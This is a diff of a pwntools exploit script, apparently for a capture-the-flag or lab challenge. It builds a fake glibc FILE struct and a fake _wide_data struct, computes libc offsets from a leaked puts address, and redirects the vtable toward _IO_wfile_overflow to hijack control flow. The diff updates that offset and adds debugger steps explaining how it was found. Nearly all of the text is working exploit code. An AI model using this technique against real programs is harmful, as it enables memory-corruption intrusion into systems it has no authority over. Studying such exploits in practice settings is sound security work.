@@ -19,11 +19,6 @@ log.info(f"puts: {hex(puts_addr)}")
 log.info(f"buf: {hex(buf_addr)}")
 
 
-_IO_wfile_underflow_maybe_mmap_plus_8 = puts_addr + 0x4b48 # _IO_wfile_underflow_maybe_mmap+8 + 0x38 is _IO_wfile_overflow
-
-# _IO_wfile_overflow would call do_allocbuf, which would call _wide_data vtable with no check
-
-
 '''
 __GI__IO_wdoallocbuf:
 
@@ -47,21 +42,31 @@ p.send(fake_wide_data)
 
 # Modify FILE struct
 p.recvuntil(b'Now reading from stdin directly to the FILE struct.\n')
-# Get the original __pad5 value from the program output
-# From your output: 0x2ef60468 = 140322187670720
-original_pad5 = puts_addr + 0x168d60  # Or extract this dynamically
 
-# In your FILE struct payload, preserve this value:
+
 file_payload = b'\x00' * 0x88
 file_payload += p64(buf_addr + 0x1f0)  # Some other field
 file_payload += p64(0xffffffffffffffff)  # _offset (-1)
 file_payload += b'\x00' * 0x8  # _codecvt
 file_payload += p64(buf_addr)  # _wide_data
 file_payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct
-file_payload += p64(puts_addr + 0x166aa0 - 0x38)
+file_payload += p64(puts_addr + 0x1649d8 - 0x38)
+
+'''
+the offset 0x1649d8 is found by:
+
+1. first pausing the program with pause()
+2. open a new terminal, do `sudo gef -pid <pid>`
+3. tele &_IO_wfile_overflow, to get the address of _IO_wfile_overflow
+4. search-pattern <address>. Similar action in pwndbg is `search -t qword "<address>"`
+5. x/x <address> - <puts_address>
+'''
 #file_payload = 'A'
 
 gdb.attach(p, s)
+time.sleep(2)
+#pause()
 p.send(file_payload)
 
 p.interactive()
+
